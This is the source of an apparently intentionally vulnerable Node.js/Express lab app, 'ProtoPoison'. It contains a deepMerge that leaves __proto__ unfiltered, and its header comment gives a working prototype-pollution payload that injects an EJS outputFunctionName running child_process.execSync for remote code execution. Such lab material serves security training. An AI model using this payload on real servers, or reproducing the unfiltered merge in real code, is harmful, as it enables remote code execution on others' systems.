/**
 * Machine 18: ProtoPoison — Vulnerable Node.js Application
 * CWE-1321: Prototype Pollution → EJS SSTI → RCE
 *
 * VULNERABILITY: The /api/settings endpoint uses a recursive merge
 * function that does NOT filter __proto__ keys. An attacker can
 * pollute Object.prototype to inject EJS template options, achieving
 * Server-Side Template Injection and Remote Code Execution.
 *
 * EXPLOIT CHAIN:
 * 1. POST /api/settings with {"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');//"}}
 * 2. GET / (triggers EJS render with polluted outputFunctionName)
 * 3. RCE as root (container runs as root)
 */

const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// In-memory settings store
let appSettings = {
    theme: 'dark',
    language: 'en',
    notifications: true,
    company: 'AcmeCorp',
};

// VULNERABLE: Recursive deep merge WITHOUT __proto__ filtering
function deepMerge(target, source) {
    for (const key in source) {
        if (typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {
            if (!target[key]) target[key] = {};
            deepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Home page — rendered with EJS (vulnerable to SSTI via polluted prototype)
app.get('/', (req, res) => {
    res.render('index', { settings: appSettings });
});

// Settings API
app.get('/api/settings', (req, res) => {
    res.json(appSettings);
});

// VULNERABLE ENDPOINT: Deep merge allows prototype pollution
app.post('/api/settings', (req, res) => {
    deepMerge(appSettings, req.body);
    res.json({ success: true, settings: appSettings });
});

// User profile page
app.get('/profile', (req, res) => {
    res.render('profile', { user: { name: 'admin', role: 'Administrator' } });
});

// Health endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'ok', uptime: process.uptime() });
});

const PORT = 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`[*] ProtoPoison app running on port ${PORT}`);
});
